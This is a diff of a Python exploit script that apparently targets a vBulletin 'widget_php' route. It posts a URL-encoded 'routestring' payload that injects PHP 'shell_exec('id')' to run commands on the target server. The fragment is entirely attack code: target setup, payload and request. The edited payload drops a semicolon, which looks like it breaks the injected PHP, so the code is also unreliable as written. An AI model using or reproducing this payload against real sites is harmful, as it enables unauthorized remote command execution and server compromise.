@@ -10,7 +10,7 @@ address =(sys.argv[1], sys.argv[2])
 dst_addr=":".join(address)
 print(dst_addr)
 URL="http://"+dst_addr
-data ={"routestring" : "ajax%2frender%2fwidget_php%26widgetConfig%5bcode%5d%3d%7b'widgetConfig%5bcode%5d'%3a+%22echo+shell_exec('id')%3bexit%3b%22%7d%0a"}
+data ={"routestring" : "ajax%2frender%2fwidget_php%26widgetConfig%5bcode%5d%3d%7b'widgetConfig%5bcode%5d'%3a+%22echo+shell_exec('id')exit%3b%22%7d"}
 res = requests.post(URL, data=data)
 response = res.text
 
